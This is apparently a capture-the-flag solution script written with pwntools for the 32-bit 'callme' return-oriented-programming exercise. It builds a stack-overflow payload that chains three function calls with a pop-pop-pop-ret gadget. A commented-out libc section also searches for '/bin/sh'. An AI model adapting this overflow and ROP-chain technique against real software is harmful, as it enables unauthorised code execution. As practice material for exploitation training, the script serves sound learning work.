from pwn import *
import sys

# config
context(os="linux", arch="i386")
context.log_level = "debug"

FILE_NAME = "./callme32"
HOST = ""
PORT = 0

if len(sys.argv) > 1 and sys.argv[1] == "r":
    conn = remote(HOST, PORT)
else:
    conn = process(FILE_NAME)

elf=ELF(FILE_NAME)

pop3ret=0x080488a9
callme_one=0x080485c0
callme_two=0x08048620
callme_three=0x080485b0
params=p32(0x1)+p32(0x2)+p32(0x3)

payload=b"A"*(0x28+0x4)

payload+=p32(callme_one)
payload+=p32(pop3ret)
payload+=params

payload+=p32(callme_two)
payload+=p32(pop3ret)
payload+=params

payload+=p32(callme_three)
payload+=p32(pop3ret)
payload+=params

conn=process(FILE_NAME)
conn.sendlineafter(">",payload)
conn.recvall()
# addr_main=elf.symbols["main"]
# addr_bss=elf.bss()
# addr_dynsym=elf.get_section_by_name(".dynsym").header["sh_addr"]
#
# libc=ELF("./")
# libc_sh=nex(libc.search(b"/bin/sh"))

